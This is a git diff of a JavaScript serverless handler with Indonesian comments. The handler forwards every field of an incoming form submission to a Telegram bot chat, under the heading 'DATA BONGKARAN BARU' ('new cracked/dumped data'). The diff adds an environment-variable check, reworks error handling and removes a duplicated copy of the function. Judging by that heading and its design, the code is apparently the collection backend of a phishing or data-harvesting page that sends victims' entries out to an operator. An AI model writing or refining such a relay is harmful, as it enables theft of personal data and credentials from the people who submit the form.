@@ -3,81 +3,55 @@ export default async function handler(req, res) {
     return res.status(405).json({ message: "Method Not Allowed" });
   }
 
+  // Ambil token dari env
+  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const CHAT_ID = process.env.CHAT_ID;
+
+  // Cek apakah env sudah terisi
+  if (!TOKEN || !CHAT_ID) {
+    return res.status(500).json({ 
+      status: "error", 
+      message: "Server environment variables are missing (TOKEN/CHAT_ID)" 
+    });
+  }
+
   try {
     const data = req.body;
-
-    // Membuat format pesan untuk Telegram
     let text = "📥 *DATA BONGKARAN BARU*\n\n";
+
     for (const k in data) {
-      // Menghindari pengiriman data kosong atau file (jika ada)
-      if (typeof data[k] !== 'object') {
-        text += `*${k.toUpperCase().replace(/_/g, ' ')}* : ${data[k]}\n`;
+      // Abaikan jika datanya kosong atau berupa object file kosong {}
+      if (!data[k] || (typeof data[k] === 'object' && Object.keys(data[k]).length === 0)) {
+        continue;
       }
+      
+      const label = k.toUpperCase().replace(/_/g, " ");
+      text += `*${label}* : \`${data[k]}\` \n`;
     }
 
-    const telegramURL = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const telegramURL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     const tgRes = await fetch(telegramURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: process.env.CHAT_ID,
+        chat_id: CHAT_ID,
         text: text,
-        parse_mode: "Markdown" // Agar tampilan di Telegram lebih rapi (bold)
+        parse_mode: "Markdown"
       })
     });
 
-    const tgData = await tgRes.json();
+    const result = await tgRes.json();
 
-    if (!tgData.ok) {
-      throw new Error(tgData.description);
+    if (result.ok) {
+      return res.status(200).json({ status: "success" });
+    } else {
+      console.error("Telegram API Error:", result);
+      return res.status(500).json({ status: "error", message: result.description });
     }
-
-    return res.status(200).json({ status: "success" });
 
   } catch (err) {
-    console.error("SERVER ERROR:", err);
-    return res.status(500).json({ status: "error", message: err.message });
-  }
-}export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ message: "Method Not Allowed" });
-  }
-
-  try {
-    const data = req.body;
-
-    // Membuat format pesan untuk Telegram
-    let text = "📥 *DATA BONGKARAN BARU*\n\n";
-    for (const k in data) {
-      // Menghindari pengiriman data kosong atau file (jika ada)
-      if (typeof data[k] !== 'object') {
-        text += `*${k.toUpperCase().replace(/_/g, ' ')}* : ${data[k]}\n`;
-      }
-    }
-
-    const telegramURL = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-    const tgRes = await fetch(telegramURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: process.env.CHAT_ID,
-        text: text,
-        parse_mode: "Markdown" // Agar tampilan di Telegram lebih rapi (bold)
-      })
-    });
-
-    const tgData = await tgRes.json();
-
-    if (!tgData.ok) {
-      throw new Error(tgData.description);
-    }
-
-    return res.status(200).json({ status: "success" });
-
-  } catch (err) {
-    console.error("SERVER ERROR:", err);
-    return res.status(500).json({ status: "error", message: err.message });
+    console.error("Runtime Error:", err);
+    return res.status(500).json({ status: "error", message: "Internal server error" });
   }
 }
